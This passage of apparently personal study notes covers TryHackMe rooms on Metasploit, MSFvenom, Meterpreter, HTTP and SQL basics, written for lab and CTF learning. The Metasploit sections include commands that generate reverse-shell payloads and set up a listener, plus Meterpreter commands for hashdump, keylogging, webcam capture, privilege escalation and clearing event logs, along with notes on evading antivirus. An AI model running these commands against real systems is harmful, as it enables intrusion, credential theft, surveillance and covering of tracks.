  * `set <PARAMETER> <VALUE>`: Sets a variable for the current module (e.g., `set RHOSTS 10.10.10.1`).
  * `setg <PARAMETER> <VALUE>`: Sets a global variable across all modules.
  * `unset <PARAMETER>` / `unset all` / `unsetg <PARAMETER>`: Clears parameters.
* **Execution:**
  * `check`: Tests if the target is vulnerable without actually exploiting it (if supported by the module).
  * `exploit` (or `run`): Executes the selected module.
  * `exploit -z`: Executes the exploit and immediately sends the resulting session to the background.
* **Session Management:**
  * `background` (or `Ctrl+Z`): Moves your current active session to the background, returning you to the `msf6 >` prompt.
  * `sessions`: Lists all currently active, backgrounded sessions.
  * `sessions -i <ID>`: Interacts with a specific backgrounded session (e.g., `sessions -i 2`).

**Takeaways / Notes:**
* Always run `show options` before hitting `exploit`. Sometimes default parameters (like `RPORT`) are pre-populated with standard ports, but your specific target might be running the service on a non-standard port!

---

## Room: [Metasploit: Exploitation]

**Key Concepts:**
* **Metasploit vs. Nmap:** While Metasploit has built-in port scanners, they are generally slower than standalone Nmap. 
    * *Crucial Difference:* By default, Nmap scans the top 1,000 most common ports. Metasploit's default TCP scanner scans ports 1 through 10,000. 
* **Targeted Service Enumeration:** Where Metasploit's auxiliary scanners truly shine is in targeted service enumeration. Once you know a port is open, MSF modules can quickly fingerprint the exact software version or pull configuration details (like SMB shares or NetBIOS names).
* **NetBIOS and System Roles:** Scanning NetBIOS (often on UDP 137 or TCP 139) can reveal the system's hostname. In a corporate network, a name like `CORP-DC` immediately tells you it's a high-value Domain Controller.

**Tools & Commands:**
* **Finding Scanners:**
  * `search portscan`: Lists the built-in MSF port scanners (e.g., `auxiliary/scanner/portscan/tcp`).
* **Scanner Options:**
  * `CONCURRENCY`: Number of targets to scan simultaneously.
  * `THREADS`: Number of concurrent threads per host. (Increase this to speed up MSF scans).
  * `PORTS`: The port range to scan.
* **Running Nmap natively:**
  * `nmap -sS <IP>`: You can run Nmap commands directly from the `msf6 >` prompt! This is often the fastest way to get initial port data without leaving the framework.
* **Helpful Auxiliary Scanners:**
  * `use auxiliary/scanner/discovery/udp_sweep`: Quickly identifies common UDP services like DNS or NetBIOS without doing a painfully slow full UDP port scan.
  * `use auxiliary/scanner/smb/smb_version`: Identifies the exact Windows OS build and SMB version running on the target.
  * `use auxiliary/scanner/smb/smb_enumshares`: Enumerates available SMB file shares.

**Takeaways / Notes:**
* If your engagement requires pure speed for an initial sweep, just use `nmap` directly in the console. Then, use Metasploit's specific `auxiliary/scanner/` modules to deep-dive into the specific services you found (like SMB, HTTP, or FTP).

**Database and Workshop**

* **Why use the database?** When dealing with multiple targets, manually typing `set RHOSTS <IP>` over and over is tedious and prone to errors. The database stores all your scan results and allows you to load targets directly into modules.
* **Workspaces:** Workspaces act like separate project folders within the database. You can isolate data between different clients or different CTF boxes (e.g., creating a workspace named "tryhackme" so it doesn't mix with your "hackthebox" data).

**Initial Setup (Kali Linux / Local Installs):**
*(Note: This is already done on the TryHackMe AttackBox)*
1. Start the database service: `systemctl start postgresql`
2. Initialize the MSF database (must be run as the postgres user): `sudo -u postgres msfdb init`
3. Verify connection in `msfconsole`: `db_status`

**Tools & Commands:**
* **Workspace Management:**
  * `workspace`: Lists all workspaces (the current one is marked with `*`).
  * `workspace -a <name>`: Adds a new workspace.
  * `workspace <name>`: Switches to the specified workspace.
  * `workspace -d <name>`: Deletes a workspace.

* **Database-Driven Scanning & Enumeration:**
  * `db_nmap <nmap_flags> <IP>`: Runs Nmap, but **automatically saves all results into the Metasploit database** for the current workspace.
  * `hosts`: Lists all IP addresses and OS information currently saved in the database.
  * `services`: Lists all discovered open ports and services across all saved hosts.
  * `services -S <keyword>`: Searches the database for a specific service (e.g., `services -S netbios`).

* **Automating Exploitation (The Golden Workflow):**
  Instead of manually typing target IPs, you can pull them straight from the database into your exploit:
  1. `use <module>`
  2. `hosts -R`: Automatically populates the `RHOSTS` parameter of the current module with every IP address saved in the database!

**Takeaways / Notes:**
* The `db_nmap` command is arguably one of the most powerful integrations in Metasploit. Running `db_nmap -sV -p- <Target_Subnet>` at the start of an engagement populates your database with every open port on the network, allowing you to instantly search for "low-hanging fruit" like open SMB or FTP ports using the `services` command.

**Vulnerability Scanning**

* **Low-Hanging Fruit:** In penetration testing, this refers to vulnerabilities that are easy to spot and easy to exploit. They often provide a quick foothold into a network or instant administrative access (e.g., default credentials, unpatched legacy services, or misconfigured open shares).
* **The Recon Reliance:** Metasploit is only as good as the information you feed it. The more thoroughly you scan and fingerprint a target (finding exact version numbers and running services), the more accurately you can search for a matching exploit module.
* **Targeted Scanning (VNC Example):** If your initial Nmap scan reveals port 5900 (VNC) is open, you don't immediately jump to an exploit. Instead, you use Metasploit's specific `auxiliary/scanner` modules to probe it further. For instance, testing for blank passwords or brute-forcing weak credentials.

**Tools & Commands:**
* **Searching by Service:**
  * Type `use auxiliary/scanner/vnc/` and hit `Tab` twice. This will list all available scanning modules specifically designed for VNC (e.g., `vnc_login`, `vnc_none_auth`).
* **Investigating a Module:**
  * `info`: Before running a scanner (like `auxiliary/scanner/vnc/vnc_login`), always run the `info` command. It explains exactly what the module does, who wrote it, and lists all the configurable options (like setting a custom password dictionary via the `PASS_FILE` option).

**Takeaways / Notes:**
* Always check for authentication bypasses or default credentials before trying to throw a complex exploit at a service. An `auxiliary/scanner` module like `vnc_none_auth` can instantly tell you if the VNC server was left completely unprotected, saving you hours of unnecessary work!

**MSFvenom**
* **MSFvenom:** A standalone tool within the Metasploit Framework that combines payload generation and encoding. It allows you to create custom malicious executables, scripts, or web files for almost any operating system.
* **Encoders (The AV Myth):** Encoders (like `x86/shikata_ga_nai` or `php/base64`) change the signature of the payload. While this used to bypass older Antivirus (AV), modern AV easily catches standard MSFvenom payloads. True evasion requires custom obfuscation or shellcode injection.
* **Handlers ("Catching a Shell"):** When you execute a standalone reverse shell payload on a target, it reaches back out to your attacking machine. You must have a listener running to "catch" that connection. Metasploit's `exploit/multi/handler` is the universal tool for this job.

**Tools & Commands (MSFvenom):**
* `msfvenom -l payloads`: Lists all available payloads you can generate.
* `msfvenom --list formats`: Lists all supported output formats (exe, elf, raw, asp, etc.).
* **Common Payload Generation Examples:** *(Replace `<IP>` and `<PORT>` with your AttackBox IP and listening port)*
  * **Linux (ELF):** `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` *(Note: requires `chmod +x shell.elf` on the target before running).*
  * **Windows (EXE):** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe`
  * **PHP:** `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`
  * **Python:** `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py`

**Tools & Commands (Setting up the Listener):**
Inside `msfconsole`:
1. `use exploit/multi/handler`: Loads the universal listener.
2. `set PAYLOAD <exact_payload_used_in_msfvenom>`: e.g., `set payload windows/meterpreter/reverse_tcp`.
3. `set LHOST <Your_IP>`
4. `set LPORT <Your_Port>`
5. `run`: Starts the listener. Now, wait for the payload to be executed on the target!

**Takeaways / Notes:**
* **The PHP Web Shell Trap:** When generating a raw PHP payload with MSFvenom, it usually outputs commented-out PHP tags at the top `/*<?php /**/` and misses the closing tag `?>`. You *must* edit the generated `shell.php` file in a text editor to clean up the `<?php` tag and add `?>` at the end, or the web server will just display the raw code instead of executing it!

---

## Room: [Metasploit: Meterpreter]

**Key Concepts:**
* **What is Meterpreter?** It is an advanced, dynamically extensible payload that provides a complex command-and-control shell. Once an exploit runs successfully, Meterpreter acts as the agent living on the target machine, allowing you to run specialized commands, pivot, and dump hashes.
* **In-Memory Execution (Diskless Stealth):** * *The Problem:* Most Antivirus (AV) works by scanning files the moment they are written to the hard drive. If you drop a file named `malware.exe`, the AV catches it instantly.
    * *The Solution:* Meterpreter runs entirely in the target's RAM (Random Access Memory). It never writes a file to the physical disk. Therefore, traditional file-scanning AV has nothing to detect.
* **Process Migration/Injection:** Instead of showing up in the Task Manager as `meterpreter.exe`, it injects itself into existing, legitimate system processes (like `spoolsv.exe` or `explorer.exe`). Even if a defender checks the running processes or the loaded DLLs, they won't immediately see anything malicious.
* **Encrypted Communications:** Meterpreter encrypts its connection back to your AttackBox (using TLS). This prevents Network Intrusion Detection Systems (IDS/IPS) from reading the traffic and flagging it as malicious, assuming the network doesn't decrypt outbound HTTPS traffic.



**Tools & Commands (Inside a Meterpreter Session):**
* `getpid`: Returns the Process ID (PID) that your current Meterpreter session is actively hiding inside.
* `ps`: Lists all running processes on the target system (similar to Windows Task Manager or Linux `top`). You can use this to find a more stable process to migrate into.
* *(Windows Command)* `tasklist /m /fi "pid eq <PID>"`: A Windows command prompt command that lists all DLLs loaded by a specific process ID. (Used here to prove that Meterpreter doesn't load obvious malicious DLLs).

**Takeaways / Notes:**
* While Meterpreter's in-memory execution is stealthy against basic, legacy AV, modern Endpoint Detection and Response (EDR) solutions (like CrowdStrike or SentinelOne) monitor memory and behavior. They *will* detect a raw Meterpreter payload, so it is not a silver bullet!

**Flavors**

* **Staged vs. Inline (Single) Refresher:** * *Staged:* Sent in two parts. A tiny "stager" is sent first, which then reaches back to your attacking machine to download the rest of the bulky Meterpreter payload.
    * *Inline (Single):* The entire payload is sent and executed in one single step.
* **Platform Versatility:** Meterpreter isn't just for Windows! There are specific versions built for Android, Apple iOS, Java, Linux, OSX, PHP, and Python.
* **The 3 Rules of Payload Selection:** When deciding which Meterpreter payload to use, evaluate:
    1. **Target OS:** What is the architecture and operating system? (e.g., Windows x64 vs. Linux ARM).
    2. **Target Components:** What interpreters are already installed? (e.g., If it's a web server running PHP, a PHP Meterpreter might be the easiest route).
    3. **Network Restrictions:** How is the firewall configured? If raw TCP connections are blocked outbound, you might need to use a `reverse_https` payload so the traffic looks like normal web browsing.

**Tools & Commands:**
* **Listing Payloads via MSFvenom:**
  `msfvenom --list payloads | grep meterpreter`
  *Explanation:* Lists all hundreds of payloads in the framework, but pipes the output to `grep` to filter only the ones containing the word "meterpreter".
* **Checking Compatible Payloads in MSFconsole:**
  `show payloads`
  *Explanation:* When inside an exploit context (like `exploit/windows/smb/ms17_010_eternalblue`), this command lists only the payloads that are mathematically and architecturally compatible with that specific exploit.

**Takeaways / Notes:**
* Exploits usually have a default payload configured (e.g., EternalBlue defaults to `windows/x64/meterpreter/reverse_tcp`). Always double-check this default! If your target blocks outbound TCP over port 4444, the default payload will fail silently, even if the exploit itself was successful.

**Essential Commands (Long)**

* **Context-Sensitive Help:** The commands available in Meterpreter change depending on the payload version (e.g., Windows vs. Linux vs. Android). Typing `help` or `?` will dynamically generate a list of commands supported by your specific session.
* **Built-in Tools:** These commands run directly within the Meterpreter memory space on the target system. They do not require you to upload additional scripts or executables, which helps maintain your stealth.



**Tools & Commands (By Category):**

**Core Commands (Session Management):**
* `background` / `bg`: Sends the current Meterpreter session to the background and returns to the `msf6 >` prompt.
* `sessions`: Switch to another active session.
* `migrate`: Moves the active Meterpreter payload into a different running process on the target (crucial for stability and stealth).
* `load`: Loads additional Meterpreter extension modules.
* `exit`: Terminates the session entirely.

**File System Commands:**
* `pwd` / `cd` / `ls`: Print working directory, change directory, and list files.
* `cat` / `edit`: View or directly edit a file on the target.
* `rm`: Delete a file.
* `search`: Search for specific files (e.g., `search -f *.txt`).
* `upload` / `download`: Move files between your attacking machine and the target system.

**Networking Commands:**
* `ifconfig` / `arp` / `netstat` / `route`: Standard network enumeration tools to view interfaces, MAC addresses, active connections, and routing tables.
* `portfwd`: Forwards a local port on your AttackBox to a remote service on the target network (essential for pivoting).

**System Commands:**
* `getuid`: Shows the user account your Meterpreter session is currently running under.
* `getpid`: Shows your current Process ID.
* `ps`: Lists all running processes on the target.
* `kill` / `pkill`: Terminates processes by ID or by name.
* `sysinfo`: Retrieves OS details, architecture, and domain information.
* `shell`: Drops you out of Meterpreter and into a standard system command shell (like `cmd.exe` or `/bin/bash`).
* `clearev`: Clears the application, system, and security event logs on a Windows target!

**Surveillance & Privilege Escalation (Others):**
* `getsystem`: A powerful automated script that attempts multiple known techniques to instantly elevate your privileges to `NT AUTHORITY\SYSTEM` (Root equivalent on Windows).
* `hashdump`: Dumps the contents of the SAM database, giving you the NTLM password hashes for all users on the machine.
* `keyscan_start` / `keyscan_dump` / `keyscan_stop`: Logs keystrokes from the remote user.
* `screenshot` / `screenshare`: Captures the remote user's interactive desktop.
* `record_mic` / `webcam_snap` / `webcam_stream`: Interacts with attached hardware to record audio or video.

**Takeaways / Notes:**
* **Manage your expectations:** Just because a command is listed in the `help` menu doesn't mean it will work. For example, if you exploit a headless Windows Server in a data center, running `webcam_snap` will fail because the hardware doesn't exist.
* The `getsystem` and `hashdump` commands are the "holy grail" of Windows post-exploitation. If you can run those successfully, you own the box.

**Post-Exploitation**

**Tools & Commands:**
* **`getuid`:** Displays the user account your Meterpreter session is running as. Use this immediately to check if you have administrative/SYSTEM privileges.
* **`ps`:** Lists running processes. Use this to find a stable process (and its PID) to migrate into.
* **`migrate <PID>`:** Moves your Meterpreter session into the specified Process ID.
* **`hashdump`:** Dumps the contents of the SAM database. The output will show the username, user ID, and the NTLM hash. You can crack these offline or use them directly in "Pass-the-Hash" attacks.
* **`search -f <filename>`:** Searches the target's file system for specific files. Extremely useful for finding `flag.txt` in CTFs or `config.php` files in real-world engagements.
* **`shell`:** Drops you out of the Meterpreter interface and into a standard system command line (like `cmd.exe` on Windows). 
    * *Tip:* Press `Ctrl+Z` to background the standard shell and return to your Meterpreter prompt.


**Takeaways / Notes:**
* Always check your privileges (`getuid`) *before* you `migrate`. If you have `NT AUTHORITY\SYSTEM`, make sure the process you are migrating into is also owned by `SYSTEM` (like `spoolsv.exe` or `lsass.exe`).

---

## Room: [Web Application Basics]

**Web App Overview**

* **Objective:** Understand the core components that make up a web application by separating the Front End (what the user sees) from the Back End (the engine under the surface).

### The Planet Analogy
Think of a web application as a planet. The **Front End** is the visible surface that astronauts (users) explore and interact with. The **Back End** consists of the invisible, underlying structures (gravity, atmosphere, core) that keep the planet functioning.

### Front End (The Surface)
These technologies dictate the experience inside the user's web browser.

* **HTML (Hypertext Markup Language):** The foundational structure. It provides the core instructions to the browser on what to display. *(Analogy: The DNA that puts a simple organism together).*
* **CSS (Cascading Style Sheets):** Controls the standard appearance, layouts, colors, and typography. *(Analogy: The traits that dictate the color, shape, and texture of the organism).*
* **JavaScript (JS):** Enables complex, dynamic activity and decision-making within the browser. *(Analogy: The brain of the organism that allows it to interact with its environment).*

### Back End (Under the Surface)
These are the non-visual infrastructure components that enable the web application to actually function, store data, and process logic.
* **Database:** The system where information is stored, modified, and retrieved (like saving a user's preferences). *(Analogy: A library or filing cabinet).*
* **Infrastructure:** The underlying servers, storage, and networking devices that support the application. *(Analogy: The roads, cars, and fuel of the planet).*
* **WAF (Web Application Firewall):** An optional but critical security component that filters out malicious requests before they reach the web server. *(Analogy: The planet's atmosphere protecting inhabitants from harmful UV rays).*

### Key Takeaways
A web application is a split ecosystem. Front End components (HTML, CSS, JS) focus entirely on the user's browser experience, while Back End components (Web Servers, Databases, WAFs) act as the hidden engine processing the data securely.

**Uniform Resource Locator, URL**

* **Objective:** Understand the complete anatomy of a web address and the unique security implications of each individual component.

### Key Concepts: The Anatomy of a URL
A URL is not just an address; it is a structured set of instructions that guides your browser to a specific online resource. Understanding its parts is critical for web development and finding security vulnerabilities.

* **Scheme:** The protocol used to access the website. **HTTPS** (Secure) is heavily recommended over **HTTP** because it encrypts the connection.
* **User:** Rarely used today due to extreme security risks. It allows including login credentials (like a username) directly in the URL to access authenticated resources, exposing sensitive info in plain text.
* **Host / Domain:** The most critical part of the URL indicating the exact website you are accessing. 
  * *Security Note:* Attackers register domains with minor, easily missed spelling differences (a technique called **typosquatting**) to execute devastating phishing attacks.
* **Port:** Directs the browser to the correct service/doorway on the web server. Port **80** is standard for HTTP, and Port **443** is standard for HTTPS.
* **Path:** The roadmap pointing directly to a specific file, page, or directory on the server. Proper access controls must secure these paths.
* **Query String:** Starts with a question mark (`?`) and passes data (like search terms or form inputs) to the server.
  * *Security Note:* Because users can manually modify the query string, it is a primary vector for **injection attacks** if the server doesn't sanitize the input.
* **Fragment:** Starts with a hash symbol (`#`) and points the browser to a specific section or heading on the loaded webpage. Like query strings, these must be handled securely to prevent client-side injection attacks.

### Key Takeaways
To an attacker, a URL is an attack surface. Manipulating the **Query String** or **Fragment** can lead to code injection, and registering a fake **Host/Domain** can instantly trick users into handing over their passwords. Always validate and sanitize user-controllable parts of a URL!

**HTTP Messages**

* **Objective:** Understand the structure and function of HTTP messages (Requests and Responses) that are exchanged between a user's browser and a web server.

### Key Concepts: Message Types
* **HTTP Messages:** The packets of data that make client-server interaction possible.
* **HTTP Requests:** Sent by the user (client) to trigger specific actions on the web application.
* **HTTP Responses:** Sent by the web server back to the user in response to their request.

### Key Concepts: Message Structure
Every HTTP message follows a strict format to ensure both the client and server can communicate without errors.
* **Start Line:** The introduction of the message. It defines whether it is a request or a response and provides the core details on how the message should be handled (e.g., the HTTP method or the status code).
* **Headers:** Key-value pairs that provide essential metadata and instructions about the message. This includes security policies, content types, and browser information.
* **Empty Line:** A mandatory, invisible structural divider. It explicitly tells the server or client where the headers end and the actual content begins. Without this empty line, the message will be misinterpreted and throw an error.
* **Body:** The actual data payload. In a *request*, this might be user login credentials or form data. In a *response*, this is the actual webpage HTML or API data requested by the user.

### Why It Matters
* **Troubleshooting:** Knowing the exact structure allows you to quickly diagnose communication issues, improving web application reliability.
* **Security:** Understanding where data lives within an HTTP message (Headers vs. Body) is vital for implementing strong security measures and protecting sensitive data during transmission.

### Key Takeaways
The **Empty Line** might seem trivial, but it is structurally vital. When you start manually crafting or manipulating HTTP requests to find vulnerabilities, forgetting that single empty blank line between your headers and your malicious payload will cause the entire attack to fail!

**HTTP Request: Request Line and Methods**

* **Objective:** Understand the exact structure of an HTTP Request Line, the different HTTP methods used to interact with a server, and the security risks associated with each.

### The Request Line
The request line (or start line) is the very first part of an HTTP request. It tells the web server exactly what the user is trying to do. It consists of three main parts formatted like this: `METHOD /path HTTP/version`.


### HTTP Methods & Security Implications
The method dictates the specific action the user wants to perform on the server's resource.

* **GET:** Used to *fetch* data. **Security Warning:** Never send sensitive data (like passwords or session tokens) via GET requests, as the data is placed directly in the URL and will be visible in plaintext logs and browser histories.
* **POST:** Used to *send* data to the server (like submitting a form). **Security Warning:** Always validate and sanitize user input in the body to prevent injection attacks (SQLi, XSS).
* **PUT:** Used to *replace or update* a resource. **Security Warning:** Strictly enforce authorization to ensure only allowed users can overwrite server data.
* **DELETE:** Used to *remove* a resource. **Security Warning:** Strictly enforce authorization to prevent attackers from wiping out critical data.
* **PATCH:** Updates a specific *part* of a resource, rather than replacing the whole thing.
* **HEAD:** Functions exactly like GET, but only retrieves the *headers* (no body content). Great for checking metadata quickly.
* **OPTIONS:** Asks the server what HTTP methods are allowed for a specific resource. **Security Warning:** Disable if unnecessary to limit the information given to attackers.
* **TRACE:** Echoes the received request back to the client, used for debugging. **Security Warning:** Usually disabled by administrators to prevent Cross-Site Tracing (XST) attacks.
* **CONNECT:** Used to establish a secure, encrypted tunnel (critical for HTTPS).

### The URL Path
The path tells the server exactly where to find the requested resource (e.g., `/api/users/123`).
* **Security Warning:** Attackers heavily target the URL path (such as using `../` for Directory Traversal). Always validate and sanitize the path to prevent unauthorized access to restricted server files.

### HTTP Versions
The version indicates the specific protocol rules the client and server are using to communicate.

* **HTTP/0.9 (1991):** The absolute basics. Only supported the GET method.
* **HTTP/1.0 (1996):** Introduced HTTP headers and better content support.
* **HTTP/1.1 (1997):** Brought persistent connections and chunked encoding. It is still heavily used across the web today.
* **HTTP/2 (2015):** Introduced multiplexing and header compression to drastically improve website loading speeds.
* **HTTP/3 (2022):** Built on a completely new underlying protocol (QUIC) to make connections even faster and more secure.

### Key Takeaways
The Request Line is the tip of the spear for web communication. As a security analyst, paying close attention to the HTTP Method used is critical. If a web server accidentally allows unauthenticated `PUT` or `DELETE` methods, an attacker can easily overwrite or destroy the entire website.

**HTTP Request: Headers and Body**

* **Objective:** Understand how HTTP headers pass vital metadata to the server and how the HTTP body is used to transmit actual data (like form submissions or file uploads) in various formats.



### Request Headers
Headers are key-value pairs that provide extra instructions to the web server about the request, the browser, or the data being sent.

| Header | Example | Description |
| :--- | :--- | :--- |
| **Host** | `Host: tryhackme.com` | Specifies the exact domain name of the web server the request is targeting. |
| **User-Agent** | `User-Agent: Mozilla/5.0` | Shares metadata about the user's web browser and operating system. |
| **Referer** | `Referer: https://www.google.com/` | Indicates the URL from which the current request originated. |
| **Cookie** | `Cookie: user_type=student;` | Sends back session data or preferences that the server previously asked the browser to store. |
| **Content-Type** | `Content-Type: application/json` | Tells the server exactly what format the data in the *Body* is using so it can parse it correctly. |

### Request Body
While `GET` requests pull data, `POST` and `PUT` requests send data to the server. This data lives inside the Request Body and can be structured in several different ways depending on the application's needs.

**1. URL Encoded (`application/x-www-form-urlencoded`)**
Data is structured in `key=value` pairs. Multiple pairs are separated by an ampersand (`&`), and special characters are percent-encoded.
```http
POST /profile HTTP/1.1
Host: tryhackme.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

name=Aleksandra&age=27&country=US
```
**2. Form Data (multipart/form-data)**
Used for sending large or binary data (like image uploads). Data is separated into distinct blocks using a unique "boundary string" defined in the header.
```POST /upload HTTP/1.1
Host: tryhackme.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

aleksandra
----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="profile_pic"; filename="aleksandra.jpg"
Content-Type: image/jpeg

[Binary Data Here representing the image]
----WebKitFormBoundary7MA4YWxkTrZu0gW--
```
**3. JSON (application/json)**
JavaScript Object Notation. Data is formatted in "name": "value" pairs separated by commas and enclosed within curly braces {}. It is heavily used in modern web APIs.
```POST /api/user HTTP/1.1
Host: tryhackme.com
Content-Type: application/json
Content-Length: 62

{
    "name": "Aleksandra",
    "age": 27,
    "country": "US"
}
```

**4. XML (application/xml)**
Extensible Markup Language. Data is structured inside nested tags (similar to HTML), requiring both an opening <tag> and closing </tag>.
```POST /api/user HTTP/1.1
Host: tryhackme.com
Content-Type: application/xml
Content-Length: 124

<user>
    <name>Aleksandra</name>
    <age>27</age>
    <country>US</country>
</user>
```
### Key Takeaways
If you modify data in the HTTP Body during a penetration test (like changing a JSON parameter from "age": 27 to "age": -1), you must ensure the Content-Type header matches the data structure you are using, or the server will instantly reject your payload!

**HTTP Response: Status Line and Status Codes**

* **Objective:** Understand how a web server communicates the result of a request back to the client using the Status Line and standardized 3-digit Status Codes.

### The Status Line
The very first line in every HTTP response. It provides three critical pieces of information to the client's browser:
* **HTTP Version:** The protocol version being used (e.g., HTTP/1.1).
* **Status Code:** A three-digit number indicating the exact outcome of the request.
* **Reason Phrase:** A short, human-readable message explaining the status code (e.g., "Not Found").

### Status Code Categories
Status codes are grouped into five distinct blocks. Knowing the first digit instantly tells you the general outcome of the request.



* **1xx (Informational Responses 100-199):** The server has received part of the request and is waiting for the rest. It’s a "keep going" signal.
* **2xx (Successful Responses 200-299):** Everything worked perfectly. The server processed the request and sent back the requested data.
* **3xx (Redirection Messages 300-399):** The requested resource has moved. The response usually provides the new URL to redirect the browser.
* **4xx (Client Error Responses 400-499):** There is a problem with the *request*. The client messed up (e.g., bad URL syntax, missing authentication, or requesting a file that doesn't exist).
* **5xx (Server Error Responses 500-599):** The server encountered a fatal error while trying to process a perfectly valid request. It is a server-side issue, not the client's fault.

### Common Status Codes Cheat Sheet



| Code | Reason Phrase | Explanation |
| :--- | :--- | :--- |
| **100** | Continue | The server got the first part of the request and is ready for the rest. |
| **200** | OK | The request was successful, and the server is returning the resource. |
| **301** | Moved Permanently | The resource has moved. Update your links to use the new URL. |
| **404** | Not Found | The server couldn’t find the requested resource. Check the URL path! |
| **500** | Internal Server Error | The server broke or encountered an unexpected condition while processing. |

### Key Takeaways
When troubleshooting or hunting for vulnerabilities, the first digit of the status code tells the story. A **4xx** means your payload or request was malformed or blocked, while a **5xx** often means you successfully broke something on the server side (which can sometimes lead to discovering interesting vulnerabilities!).

**HTTP Response: Headers and Body**

* **Objective:** Understand the role of HTTP response headers in guiding client behavior, the security implications of specific headers, and the contents of the response body.

### Key Concepts: Response Headers
Response headers are key-value pairs sent by the web server that provide the client's browser with crucial metadata and instructions on how to handle the incoming data.

**Required / Crucial Headers:**
* **`Date:`** The exact timestamp when the server generated the response (e.g., `Fri, 23 Aug 2024 10:43:21 GMT`).
* **`Content-Type:`** Tells the browser exactly what kind of content it is receiving and the character set used so it can render it properly (e.g., `text/html; charset=utf-8`).
* **`Server:`** Identifies the specific web server software handling the request (e.g., `nginx`). 
  * *Security Warning:* This header often leaks exact software versions to attackers, making it easy to look up known exploits. Best practice is to obscure or completely remove this header.

**Other Common Headers:**
* **`Set-Cookie:`** Sends a session cookie from the server for the client to store and send back with future requests. 
  * *Security Warning:* Cookies must be secured using the `HttpOnly` flag (prevents JavaScript from stealing the cookie) and the `Secure` flag (ensures the cookie is only ever transmitted over encrypted HTTPS).
* **`Cache-Control:`** Instructs the browser on how long it is allowed to cache the response (e.g., `max-age=600`). Use the `no-cache` directive to prevent sensitive information from being saved locally.
* **`Location:`** Used alongside 3xx Redirection status codes to tell the client the new URL to navigate to. 
  * *Security Warning:* If an attacker can manipulate the input that generates this header, it leads to an **Open Redirect** vulnerability, allowing them to blindly route users to malicious phishing sites.

### Key Concepts: The Response Body
The Response Body is the actual payload or data that the server is sending back to the user (the raw HTML, JSON, images, or files).
* *Security Warning:* To prevent **Cross-Site Scripting (XSS)** attacks, the server must strictly sanitize and escape any user-generated content before it is reflected back into the response body.

### Key Takeaways
Headers control the rules of engagement between the browser and the server. Missing security flags on a `Set-Cookie` header or a highly verbose `Server` header are incredibly common, low-hanging fruit findings during a web application penetration test.

**Security Headers**

* **Objective:** Understand how specific HTTP response headers are configured by administrators to actively defend web applications against common client-side attacks like Cross-Site Scripting (XSS), MIME sniffing, and downgrade attacks.

### Key Concepts: HTTP Security Headers
Security headers are instructions sent by the server that tell the client's web browser to enforce strict security rules while rendering the webpage.


#### 1. Content-Security-Policy (CSP)
Provides a massive layer of defense against Cross-Site Scripting (XSS) by explicitly defining an "allowlist" of safe domains that the browser is permitted to load content from.
* **`default-src`:** The fallback policy for all content types. Using `'self'` restricts loading to only the current website.
* **`script-src`:** Defines exactly where JavaScript can be loaded from (e.g., `script-src 'self' https://cdn.tryhackme.com`).
* **`style-src`:** Defines where CSS stylesheets can be loaded from.


#### 2. Strict-Transport-Security (HSTS)
Strictly enforces that web browsers must *only* connect to the site over encrypted HTTPS, preventing attackers from forcing a connection downgrade to plain-text HTTP.
* **`max-age`:** The time (in seconds) the browser is instructed to remember and enforce this strict HTTPS rule.
* **`includeSubDomains`:** An optional flag that applies the HTTPS-only rule to all of the site's subdomains.
* **`preload`:** Allows the domain to be hardcoded into modern browsers' global HSTS preload lists, ensuring even the *very first* visit to the site is forced to HTTPS.

#### 3. X-Content-Type-Options
Prevents the browser from attempting to guess ("sniff") the MIME type of a file. It forces the browser to strictly trust the `Content-Type` header provided by the server, preventing attackers from disguising malicious HTML/JavaScript as an innocent image file.
* **`nosniff`:** The explicit directive that completely disables MIME sniffing.


#### 4. Referrer-Policy
Controls exactly how much metadata is shared with a destination web server when a user clicks a hyperlink to leave the current page.
* **`no-referrer`:** The most secure option; completely disables sending any referrer information.
* **`same-origin`:** Only sends referrer info if the hyperlink goes to another page on the *same* website.
* **`strict-origin`:** Only sends referrer info if the security protocol stays exactly the same (e.g., clicking a link from an HTTPS site to another HTTPS site).
* **`strict-origin-when-cross-origin`:** Sends the full URL path for internal same-origin requests, but downgrades to only sending the domain name for external secure requests.

### Tools & Commands
* **`securityheaders.io` :** An excellent, free online tool used by security analysts to scan a website and instantly grade the implementation of its HTTP security headers.

### Key Takeaways
A strong **Content-Security-Policy (CSP)** can single-handedly stop an attacker from exploiting an XSS vulnerability, even if the underlying web application code is deeply flawed. Always check for these headers during a web assessment!

---
## Room: [SQL Fundamentals]

* **Objective:** Understand the fundamental differences between relational (SQL) and non-relational (NoSQL) databases, and learn how data is structured using tables, columns, rows, and keys.

### Key Concepts: Types of Databases
Databases are organized collections of data that make it easy to access, manipulate, and analyze information (like storing usernames/passwords for authentication).



* **Relational Databases (SQL):** Stores highly structured data in a tabular format (tables). 
  * *Best used for:* Data that is reliably received in a consistent, predictable format where accuracy is critical (e.g., processing e-commerce financial transactions).
* **Non-Relational Databases (NoSQL):** Stores data in a non-tabular format (like JSON-style document objects).
  * *Best used for:* Data that varies greatly in its format or size but needs to be organized in one place (e.g., varying user-generated content on social media).

### Relational Database Anatomy
In a relational database, data is strictly organized into structures.

* **Tables:** A broad collection of related data (e.g., a "Books" table).
* **Columns:** Define the specific pieces of information needed for a record (e.g., `id`, `Name`, `Published_date`). 
  * *Note on Data Types:* Columns strictly enforce data types. If a column is defined as an *Integer*, you cannot insert a *String* (text) into it. Common types include Strings, Integers, Floats/Decimals, and Times/Dates.
* **Rows:** A single, complete record inserted into the table (e.g., Book ID: 1, Name: Android Security Internals).

### Primary and Foreign Keys
Keys are the fundamental mechanism that creates the "relationships" in a relational database.



* **Primary Keys:** A column used to *uniquely* identify a single record in a table. 
  * *Rules:* There can only be **one** primary key column per table. No two records can share the same primary key value. (e.g., A student ID or a unique Book ID).
* **Foreign Keys:** A column in one table that perfectly matches the Primary Key of *another* table.
